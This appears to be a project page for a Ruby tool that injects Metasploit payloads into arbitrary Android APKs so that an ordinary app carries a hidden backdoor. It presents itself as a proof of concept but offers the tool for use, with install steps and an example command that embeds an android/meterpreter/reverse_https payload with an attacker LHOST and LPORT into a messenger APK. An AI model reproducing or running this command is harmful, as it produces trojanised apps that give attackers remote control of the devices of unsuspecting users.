name: Metasploit-apk-embed-payload
tagline: Embed a Metasploit Payload in an Original .Apk File
body:
> I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it. â€” [Bill Gates](http://www.goodreads.com/quotes/568877-i-choose-a-lazy-person-to-do-a-hard-job) **This script is a POC for injecting metasploit payloads on arbitrary APKs and Result of [How to Embed a Metasploit Payload in an Original .Apk File](http://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-0166901/) Lesson** **Authored by timwr, Jack64 , Updated by [xC0d3rZ](https://xc0d3rz.github.io/whoaim)** ###Installation ```bash gem install colorize ``` ###Requirements 1. Ruby (**> 1.8.7**). ###Warring Don't edit or remove **embed_tools** folder. Don't remove or edit **tmp/*** folder until script finish Embedding ###Usage ```bash apk-embed-payload.rb [target.apk] [msfvenom options] ```
e.g ```bash apk-embed-payload.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443 ```
note: Don't delete this file! It's used internally to help with page regeneration.
